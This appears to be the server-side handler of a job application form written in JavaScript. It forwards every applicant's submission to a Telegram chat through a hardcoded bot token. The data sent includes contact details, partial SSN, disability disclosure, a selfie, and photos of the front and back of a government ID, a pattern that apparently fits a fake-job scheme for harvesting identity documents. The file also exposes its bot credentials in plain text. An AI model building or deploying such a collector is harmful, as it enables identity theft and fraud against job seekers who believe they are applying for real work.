import { readFile } from 'fs/promises';
import { join } from 'path';

const BOT_TOKEN = '8747195961:AAGIsJkItURdfd2zxI61kbw2CTLlHjLpMV8';
const CHAT_ID = '-5117669543';
const TELEGRAM_API = 'https://api.telegram.org';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { formData, files } = JSON.parse(req.body);

    console.log('[API] Submission received');
    console.log('[API] Form fields:', Object.keys(formData).length);
    console.log('[API] Files:', files ? Object.keys(files).length : 0);

    // Step 1: Format and send text message
    const message = formatMessage(formData);
    console.log('[API] Sending text message to Telegram...');
    
    const messageResponse = await fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const messageData = await messageResponse.json();
    if (!messageData.ok) {
      throw new Error(`Message failed: ${messageData.description}`);
    }
    console.log('[API] Text message sent successfully');

    // Step 2: Upload files if present
    if (files) {
      for (const [fieldName, fileData] of Object.entries(files)) {
        try {
          console.log(`[API] Uploading file: ${fieldName}`);
          
          // Determine file type and endpoint
          const isPhoto = ['a-selfie', 'a-id-photo-front', 'a-id-photo-back'].includes(fieldName);
          const endpoint = isPhoto ? 'sendPhoto' : 'sendDocument';
          const paramName = isPhoto ? 'photo' : 'document';
          
          // Get caption
          const captions = {
            'a-selfie': '📸 Selfie',
            'a-id-photo-front': '🪪 Government ID - FRONT',
            'a-id-photo-back': '🪪 Government ID - BACK',
            'a-cv': '📄 Resume/CV'
          };

          // Create FormData for file upload
          const form = new FormData();
          form.append('chat_id', CHAT_ID);
          form.append(paramName, new File([Buffer.from(fileData.data, 'base64')], fileData.name, { type: fileData.type }));
          form.append('caption', captions[fieldName] || fieldName);

          const fileResponse = await fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/${endpoint}`, {
            method: 'POST',
            body: form
          });

          const fileResponseData = await fileResponse.json();
          if (!fileResponseData.ok) {
            console.warn(`[API] File ${fieldName} failed: ${fileResponseData.description}`);
          } else {
            console.log(`[API] File ${fieldName} uploaded successfully`);
          }
        } catch (err) {
          console.warn(`[API] File upload error for ${fieldName}:`, err.message);
        }
      }
    }

    console.log('[API] ✅ Submission complete');
    return res.status(200).json({ 
      success: true, 
      message: 'Application submitted successfully' 
    });

  } catch (error) {
    console.error('[API] Submission error:', error);
    return res.status(500).json({ 
      error: error.message || 'Submission failed' 
    });
  }
}

function formatMessage(data) {
  let message = '📋 NEW APPLICATION RECEIVED\n\n';
  
  const sections = {
    '👤 Personal Information': ['a-fullname', 'a-email', 'a-phone', 'a-location'],
    '🏫 Education': ['a-highschool', 'a-highschool-status'],
    '💼 Professional': ['a-linkedin', 'a-github', 'a-role', 'a-experience', 'a-portfolio'],
    '🎯 Skills': ['a-sql', 'a-python', 'a-tableau', 'a-excel', 'a-coding'],
    '📋 Compliance': ['a-govid', 'a-ssn', 'a-availability', 'a-disability', 'a-productive-time'],
    '📝 Additional': ['a-cover', 'a-consent']
  };

  const labels = {
    'a-fullname': 'Full Name',
    'a-email': 'Email',
    'a-phone': 'Phone',
    'a-location': 'Location',
    'a-highschool': 'High School',
    'a-highschool-status': 'High School Status',
    'a-linkedin': 'LinkedIn',
    'a-github': 'GitHub',
    'a-role': 'Position',
    'a-experience': 'Years Experience',
    'a-portfolio': 'Portfolio URL',
    'a-sql': 'SQL Level',
    'a-python': 'Python Level',
    'a-tableau': 'Tableau Level',
    'a-excel': 'Excel Level',
    'a-coding': 'Coding Knowledge',
    'a-govid': 'Government ID Type',
    'a-ssn': 'SSN (Last 4)',
    'a-availability': 'Availability',
    'a-disability': 'Disability Disclosure',
    'a-productive-time': 'Most Productive Time',
    'a-cover': 'Cover Note',
    'a-consent': 'Consent'
  };

  for (const [section, fields] of Object.entries(sections)) {
    const hasContent = fields.some(f => data[f]);
    if (!hasContent) continue;

    message += `*${section}*\n`;
    fields.forEach(field => {
      const value = data[field];
      if (value) {
        const label = labels[field] || field;
        message += `• ${label}: ${value}\n`;
      }
    });
    message += '\n';
  }

  return message;
}
